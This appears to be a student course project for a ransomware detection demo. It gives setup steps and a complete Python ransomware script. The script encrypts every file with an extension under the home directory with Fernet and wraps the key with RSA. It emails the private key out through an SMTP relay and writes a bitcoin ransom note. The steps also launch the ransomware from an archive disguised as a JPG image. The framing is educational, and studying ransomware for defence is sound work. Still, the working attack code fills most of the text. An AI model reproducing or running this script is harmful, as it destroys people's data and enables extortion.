Steps for running scripts

1.download all of the files and ensure they don't have file extensions on them. Also make sure they are in /home to make it easier to run everything.
2.Run the following commands in termianl to make sure that the files will run properly and there are no hidden characters anywhere
	sudo mkdir /REPLACEME
	sudo chmod 777 /REPLACEME
	chmod 777 mitigation
	chmod 777 monitoring
	chmod 777 backup
	sed -i -e 's/\r$//' mitigation
	sed -i -e 's/\r$//' monitoring
	sed -i -e 's/\r$//' backup
	
  	if rsa is not installed run this command: pip install rsa
  	
3.Run "./backup" to create a backup of the system
4.Run "unzip TheImage.jpg" to expand the image

*NOTE* make sure you have the following command pretyped in terminals to ensure that you can run them fast enough.
Run them in this order.

5.Run "./monitoring" to start monitoring
6.Run "python3 detection" to start detection
7.Run "./content/image" to start ransomeware
8.AS SOON AS DETECTION says "Alert!" in terminal run "./mitigation" to kill ransomeware and restore system
9.Kill all processes still running by pressing ctrl+c in each terminal

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

This python script is the ransomware. It encrypt everything in the home directory.
There are Global variable that can be changed but are fine to keep as is.
This script will first generate a ransom message.
Then generate a fernet key
Then generate public and private keys
Then it will begin encrypting with the fernet key
Then it begins to encrypt with rsa keys
Then it send the private key your email you have set
Finally it deletes the private key from the computer

There are a few files to be expected to generate in the /home directory
It is expected for all files with extensions to be encrypted after this script is ran.

~~~~~~~~~~~~~~~~~~~~~~attack script below~~~~~~~~~~~~~~~~~~~~~~

#!/usr/bin/python3

import glob
import os
import cryptography
import rsa
from cryptography.fernet import Fernet
import smtplib

######################################################################################################
###############Globals - EDIT these to your location to encrypt and store keys########################
######################################################################################################

# Step 1:
FERNET_KEY_LOCATION = os.path.expanduser('~') + '/'  # OPTIONAL - CHANGE TO KEY DIRECTORY
RSA_KEY_LOCATION = os.path.expanduser('~') + '/'  # OPTIONAL - CHANGE TO KEY DIRECTORY
ENCRYPTION_PATH = os.path.expanduser('~') + '/'  # OPTIONAL - CHANGE TO KEY DIRECTORY
DESKTOP_DIRECTORY = os.path.expanduser('~') + '/' + 'Desktop' +'/' # # OPTIONAL - CHANGE TO DESKTOP DIRECTORY
SENDER_EMAIL = 'youremail@yahoo.com'  # CHANGE TO SENDER EMAIL
RECEIVER_EMAIL = 'receiver@my.unt.edu'  # CHANGE TO RECEIVER EMAIL


######################################################
####Functions###Should Not Need Editing###############
######################################################

# get_files uses glob to retrieve and create an array for the file locations
def get_files():
    f_array = [f for f in glob.glob(ENCRYPTION_PATH + "**/*.*", recursive=True)]
    return f_array


# generate the symmetrical key and store it somewhere
def generate_fernet_key():
    fernet_key = Fernet.generate_key()
    with open(FERNET_KEY_LOCATION + 'fernetKey', 'wb') as fkey:
        fkey.write(fernet_key)


# generate the asymmetrical keys
def generate_rsa_keys():
    (public_key, private_key) = rsa.newkeys(2048)
    with open(RSA_KEY_LOCATION + 'publicKey', "wb") as key:
        key.write(public_key.save_pkcs1())
    with open(RSA_KEY_LOCATION + 'privateKey', "wb") as key:
        key.write(private_key.save_pkcs1())


# load rsa keys
# read each key and return both keys for encrypt rsa function
def rsa_load_keys():
    with open(RSA_KEY_LOCATION + 'publicKey', 'rb') as k:
        publicKey = rsa.PublicKey.load_pkcs1(k.read())
    with open(RSA_KEY_LOCATION + 'privateKey', 'rb') as k:
        privateKey = rsa.PrivateKey.load_pkcs1(k.read())
    return publicKey, privateKey


# encrypt files with fernet (speedy fast)
def encrypt_fernet(file_array, fernet_key):
    # read the fernet key
    with open(fernet_key, 'rb') as encrypt_key:
        f_key = encrypt_key.read()
    fernet = Fernet(f_key)
    # loop through each file name
    for f in file_array:
        # read the original file
        with open(f, 'rb') as original_file:
            original_text = original_file.read()
        # encrypt the file
        encrypted_text = fernet.encrypt(original_text)
        # write the encrypted file
        with open(f, 'wb') as encrypted_file:
            encrypted_file.write(encrypted_text)


# decrypt the files, provide file array, fernet key
def decrypt_fernet(file_array, fernet_key):
    # read the fernet key
    with open(fernet_key, 'rb') as encrypt_key:
        f_key = encrypt_key.read()
    fernet = Fernet(f_key)
    # loop through encrypted files
    for f in file_array:
        with open(f, 'rb') as encrypted_file:
            encrypted_text = encrypted_file.read()
        # decrypt the text
        decrypted_text = fernet.decrypt(encrypted_text)
        # write the decrypted text back to file
        with open(f, 'wb') as decrypted_file:
            decrypted_file.write(decrypted_text)


# Encrypt the fernetKey with RSA Public Key
def encrypt_rsa():
    pubKey, privKey = rsa_load_keys()
    with open(FERNET_KEY_LOCATION + 'fernetKey', 'rb') as k:
        fKey = k.read()
    rsa_encrypted = rsa.encrypt(fKey, pubKey)
    with open(FERNET_KEY_LOCATION + 'fernetKey', 'wb') as k:
        k.write(rsa_encrypted)


def decrypt_rsa():
    pubKey, privKey = rsa_load_keys()
    with open(FERNET_KEY_LOCATION + 'fernetKey', 'rb') as o:
        encrypted_key = o.read()
    decrypted_key = rsa.decrypt(encrypted_key, privKey)
    with open(FERNET_KEY_LOCATION + 'fernetKey', 'wb') as o:
        o.write(decrypted_key)


# send privKey in email
def send_privkey():
    sender = SENDER_EMAIL  # CHANGE TO SENDER EMAIL
    receivers = RECEIVER_EMAIL  # CHANGE TO RECEIVER EMAIL
    message = """From: Private Key Sender <email@email.me>
To: To Person <amrood.admin@gmail.com>
Subject: Group 18 Private Key\n""" + '\n' + open(RSA_KEY_LOCATION + 'privateKey', 'r').read() + """
    Enjoy
    """
    smtpObj = smtplib.SMTP('relay.appriver.com', 2525)  # use any relay you wish or keep default relay.appriver.com 2525
    smtpObj.sendmail(sender, receivers, message)


# delete privKey off client
def delete_private_key():
    os.remove(RSA_KEY_LOCATION + 'privateKey')


# create ransom message on the desktop
def create_ransom_message():
    message = "Your files are held hostage. Pay the ransom now! $1,000,000 in bitcoin to my address please. Thanks - //CSCE5500-Group 18"
    with open(ENCRYPTION_PATH + 'RANSOM_MSG', 'w') as f:  
        f.write(message)

##########################################
##########End Functions###################
##########################################

###EACH OF THE BELOW STEPS IS COMMENTED OUT ON
###PURPOSE SO YOU DO NOT ENCRYPT YOUR OWN PC ON ACCIDENT AND REQUIRES
###MANUAL ENGAGEMENT.###

### COMMENT EACH STEP OUT ONE AT A TIME SO YOU CAN WATCH EACH STEP WORK.###
### WHEN YOU ARE READY FOR USE, YOU MAY UNCOMMENT THEM ALL SO IT WORKS ON ONE RUN.###

# Step 2:
create_ransom_message()

# Step 3:
generate_fernet_key()

# Step 4:
generate_rsa_keys()

# Step 5:
filesarray = get_files()
encrypt_fernet(filesarray, FERNET_KEY_LOCATION+'fernetKey')

# Step 6:
encrypt_rsa()

# Step 7:
send_privkey()

# Step 8: 
#delete_private_key()
